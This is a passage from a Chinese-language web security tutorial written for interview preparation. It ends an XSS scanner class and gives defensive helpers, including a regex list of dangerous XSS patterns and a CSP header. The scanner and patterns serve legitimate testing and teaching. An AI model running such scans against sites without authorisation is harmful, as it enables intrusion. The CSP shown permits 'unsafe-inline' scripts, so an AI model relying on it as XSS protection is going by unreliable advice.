            'DOM manipulation occurred',
            'Unexpected script execution',
            'document.location modified'
        ]
        
        for indicator in indicators:
            if indicator in page_source:
                return True
        
        # 检查payload是否被插入到危险的上下文中
        dangerous_contexts = [
            r'<script[^>]*>[^<]*' + re.escape(payload),
            r'<[^>]+on\w+\s*=\s*["\']?[^"\']*' + re.escape(payload),
            r'href\s*=\s*["\']?javascript:[^"\']*' + re.escape(payload)
        ]
        
        for context in dangerous_contexts:
            if re.search(context, page_source, re.IGNORECASE):
                return True
        
        return False
    
    def generate_xss_report(self, vulnerabilities):
        """生成XSS测试报告"""
        if not vulnerabilities:
            return "未发现XSS漏洞"
        
        report = f"""# XSS安全测试报告

## 测试概要
- 发现XSS漏洞: {len(vulnerabilities)}个
- 漏洞类型分布:
  - Reflected XSS: {len([v for v in vulnerabilities if v['type'] == 'Reflected XSS'])}
  - Stored XSS: {len([v for v in vulnerabilities if v['type'] == 'Stored XSS'])}
  - DOM-based XSS: {len([v for v in vulnerabilities if v['type'] == 'DOM-based XSS'])}

## 漏洞详情

"""
        
        for i, vuln in enumerate(vulnerabilities, 1):
            report += f"""### {i}. {vuln['type']} - {vuln['risk']}风险
- **端点**: {vuln.get('endpoint', vuln.get('url', 'N/A'))}
- **参数**: {vuln.get('parameter', 'N/A')}
- **载荷**: `{vuln['payload']}`
- **方法**: {vuln.get('method', 'N/A')}
- **证据**: {vuln.get('evidence', '载荷在响应中未编码')}

"""
        
        return report

# XSS防护实现示例
class XSSProtection:
    @staticmethod
    def html_encode(text):
        """HTML编码防护"""
        return html.escape(text, quote=True)
    
    @staticmethod
    def whitelist_filter(text, allowed_tags=None):
        """白名单过滤"""
        if allowed_tags is None:
            allowed_tags = ['b', 'i', 'u', 'strong', 'em']
        
        # 简化的白名单实现
        import bleach
        return bleach.clean(text, tags=allowed_tags, strip=True)
    
    @staticmethod
    def content_security_policy_header():
        """CSP头设置"""
        return {
            'Content-Security-Policy': 
                "default-src 'self'; "
                "script-src 'self' 'unsafe-inline'; "
                "style-src 'self' 'unsafe-inline'; "
                "img-src 'self' data:; "
                "connect-src 'self'; "
                "font-src 'self'; "
                "object-src 'none'; "
                "media-src 'self'; "
                "frame-src 'none';"
        }
    
    @staticmethod
    def validate_input(text, max_length=1000):
        """输入验证"""
        if len(text) > max_length:
            raise ValueError("Input too long")
        
        # 检查危险模式
        dangerous_patterns = [
            r'<script[^>]*>',
            r'javascript:',
            r'on\w+\s*=',
            r'<iframe[^>]*>',
            r'<object[^>]*>',
            r'<embed[^>]*>'
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                raise ValueError("Potentially dangerous input detected")
        
        return text

# 使用示例
xss_scanner = XSSScanner('https://example.com')

# 执行各种XSS测试
all_xss_vulns = []

# 测试反射型XSS
reflected_vulns = xss_scanner.test_reflected_xss('search', '/search')
all_xss_vulns.extend(reflected_vulns)

# 测试存储型XSS  
stored_vulns = xss_scanner.test_stored_xss('/comments', '/posts/1')
all_xss_vulns.extend(stored_vulns)

# 测试DOM型XSS
dom_vulns = xss_scanner.test_dom_xss_with_browser()
all_xss_vulns.extend(dom_vulns)

# 生成报告
print(xss_scanner.generate_xss_report(all_xss_vulns))
```

---

## 专题总结

Web应用安全测试是现代应用开发中不可或缺的环节，需要掌握：

1. **漏洞理论**：深入理解OWASP Top 10等主要安全风险
2. **检测技术**：掌握各种安全漏洞的检测方法和工具使用
3. **防护策略**：了解安全编码和防护措施的实现
4. **测试工具**：熟练使用安全测试工具进行漏洞扫描
5. **合规要求**：理解安全标准和法规要求

**面试回答要点**：
- 展示对安全漏洞原理的深度理解
- 结合实际项目说明安全测试实施经验
- 强调安全左移和DevSecOps理念
- 体现安全风险评估和管理能力